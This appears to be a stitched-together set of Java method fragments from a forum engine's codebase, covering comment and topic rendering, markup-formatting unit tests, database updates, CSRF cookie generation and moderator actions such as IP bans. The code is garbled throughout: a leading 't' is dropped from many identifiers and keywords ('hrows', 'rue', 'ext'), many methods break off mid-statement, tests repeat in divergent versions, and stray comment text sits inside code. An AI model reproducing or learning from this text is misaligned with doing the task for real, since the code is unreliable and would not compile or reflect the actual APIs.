private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = extService . renderTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , MessageText message ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = extService . renderCommentText ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( extService ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
private MessageText processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return MessageText . apply ( oLorCodeFormatter . format ( msg ) , MarkupType . Lorcode$ . MODULE$ ) ; 
public void saveNewMessage ( MessageText message , int msgid ) { insertMsgbase . execute ( ImmutableMap . < String , Object > of ( " id " , msgid , 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) hrows Exception { session . removeAttribute ( " image " ) ; int msgid = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( ext , msgid ) ; return msgid ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > ags , Poll newPoll , MessageText ext , Image image ) { return prepareMessage ( message , 
public String parseCommentRSS ( String ext ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( rue , false ) , ext ) . renderXHtml ( ) ; } 
public void estEmpty ( ) { assertTrue ( extService . isEmpty ( MessageText . apply ( " [br] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( extService . isEmpty ( MessageText . apply ( " [br] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( extService . isEmpty ( MessageText . apply ( " [b] [br][/b][u] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( extService . isEmpty ( MessageText . apply ( " [list][*][br][br][*][u][/u][/list] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( extService . isEmpty ( MessageText . apply ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertFalse ( extService . isEmpty ( MessageText . apply ( " [code]text[/code] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private static String fixFormat ( String mode ) { if ( ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( " format.mode " ) ; } return mode ; } 
public static String quote ( String ext , String newLine ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = NL_REGEXP . split ( ext ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine + = 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { if ( isCode ) { buf . append ( '' ) ; } else { buf . append ( newLine ) ; } } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( Strings . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( Strings . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = rue ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { isCode = false ; } buf . append ( line ) ; if ( currentLine < lines . length ) { if ( isCode ) { buf . append ( '' ) ; } else { buf . append ( newLine ) ; } } } } if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
static String escapeCode ( String ext ) { return CODE_ESCAPE_REGEXP . matcher ( ext ) . replaceAll ( " $1[[$2]] " ) ; } 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . ext ( ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . ext ( ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a, true) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . ext ( ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; oHtmlFormatter . setMessageDao ( messageDao ) ; oHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; extService = new MessageTextService ( lorCodeService ) ; } 
private String formatNtobr ( String str ) { return extService . preprocessPostingText ( str , " ntobr " ) . ext ( ) ; } 
private String format ( String str ) { return extService . preprocessPostingText ( str , " lorcode " ) . ext ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", format("test>test")); 7 assertEquals("test &", formatNtobr("test &")); 8 assertEquals("test[br]test", formatNtobr("test\rtest")); 9 assertEquals("test[br]test", formatNtobr("testtest")); 10 assertEquals("[quote]test[br][/quote]test", formatNtobr(">testtest")); 11 assertEquals("[quote]test[br]test[/quote]", formatNtobr(">test>test")); 12 } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , format ( " [code=perl][/code] " ) ) ; } 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , format ( " > [[code]] test " ) ) ; assertEquals ( " [[code]] test " + 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , formatNtobr ( " >one n>>two n>one n>>>three " ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , format ( " >one n>>two n>one n>>>three " ) ) ; 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; oHtmlFormatter . setMessageDao ( messageDao ) ; oHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
private String formatNtobr ( String str ) { return MessageTextService . preprocessPostingText ( str , " ntobr " ) . ext ( ) ; } 
private String format ( String str ) { return MessageTextService . preprocessPostingText ( str , " lorcode " ) . ext ( ) ; } 
private static String fixFormat ( String mode ) { if ( MessageTextService . PostingModesJava ( ) . containsKey ( mode ) ) { return mode ; 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a, true) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . ext ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
private String formatNtobr ( String str ) { return MessageTextService . prepareUlb ( str ) ; } 
private String format ( String str ) { return MessageTextService . prepareLorcode ( str ) ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String oken = Base64 . getEncoder ( ) . encodeToString ( value ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , oken ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_ATTRIBUTE , oken ) ; } 
public void checkCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic opic , @Nullable User currentUser , Errors errors , MarkupType markup ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( opic ) ; boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , opic , errors , markup ) ; } 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic opic , MarkupType markup ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentsAllowed ( opic , currentUser , errors ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , opic , errors , markup ) ; return ! errors . hasErrors ( ) ; } 
private static String fixFormat ( String mode ) { if ( MarkupType$ . MODULE$ . AllFormIds ( ) . contains ( mode ) ) { return mode ; 
String renderToHtml ( String content , boolean nofollow ) ; } 
public void estMarkdownFormatter ( ) { assertEquals ( TEXT1_RESULT , markdownFormatter . renderToHtml ( TEXT1 , false ) ) ; } 
public void init ( ) hrows Exception { siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , rue , " UTF-8 " ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . henReturn ( secureURI ) ; } 
private void processMessageUrl ( @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) hrows URIException { ry { Topic message = opicDao . getById ( url . getMessageId ( ) ) ; 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; oHtmlFormatter . setTopicDao ( messageDao ) ; oHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void init ( ) hrows Exception { SiteConfig siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , rue , " UTF-8 " ) ; TopicDao opicDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . henReturn ( secureURI ) ; markdownFormatter = new FlexmarkMarkdownFormatter ( siteConfig , opicDao , commentDao ) ; } 
public void init ( ) hrows Exception { SiteConfig siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , rue , " UTF-8 " ) ; TopicDao opicDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . henReturn ( secureURI ) ; markdownFormatter = new FlexmarkMarkdownFormatter ( siteConfig , opicDao , commentDao , mock ( UserService . class ) , new ToHtmlFormatter ( ) ) ; 
public Topic getById ( int id ) hrows MessageNotFoundException { return findById ( id ) . orElseThrow ( ( ) - > new MessageNotFoundException ( id ) ) ; } 
public Optional < Topic > findById ( int id ) { ry { return Optional . of ( jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > new Topic ( resultSet ) , id ) ) ; 
public void moveMessages ( int user , int argetUser ) { jdbcTemplate . update ( " UPDATE comments SET userid=? WHERE userid=? " , argetUser , user ) ; jdbcTemplate . update ( " UPDATE topics SET userid=? WHERE userid=? " , argetUser , user ) ; } 
public ElasticClient elasticClient ( ) { return mock ( ElasticClient . class ) ; } 
public void moveMessages ( int user , int argetUser ) { jdbcTemplate . update ( " UPDATE comments SET userid=? WHERE userid=? " , argetUser , user ) ; jdbcTemplate . update ( " UPDATE comments SET editor_id=? WHERE editor_id=? " , argetUser , user ) ; jdbcTemplate . update ( " UPDATE edit_info SET editor=? WHERE editor=? " , argetUser , user ) ; jdbcTemplate . update ( " UPDATE topics SET userid=? WHERE userid=? " , argetUser , user ) ; } 
public boolean isUndeletable ( ) { return undeletable ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
public DeleteInfoDao deleteInfoDao ( DataSource dataSource ) { return new DeleteInfoDao ( dataSource ) ; } 
public boolean wasUserpicReset ( User user , Duration duration ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid!=action_userid) " , 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( Lists . newArrayList ( msgid ) ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( new ArrayList < > ( msgids ) ) ) ) ; } 
public boolean isCommitable ( ) { return commitable ; } 
public ModelAndView showModeratorForm ( @PathVariable String nick , HttpServletRequest request ) { User user = userService . getUser ( nick ) ; Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView modelAndView = new ModelAndView ( " confirm-password-reset " ) ; modelAndView . addObject ( " user " , user ) ; modelAndView . addObject ( " whoisLink " , UriComponentsBuilder . fromUriString ( " /people/{nick}/profile " ) . buildAndExpand ( nick ) . encode ( ) . oUriString ( ) ) ; return modelAndView ; } 
public void commence ( HttpServletRequest request , HttpServletResponse response , AuthenticationException authException ) { } } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public RedirectView showComments ( @RequestParam String nick ) { User user = userService . getUserCached ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
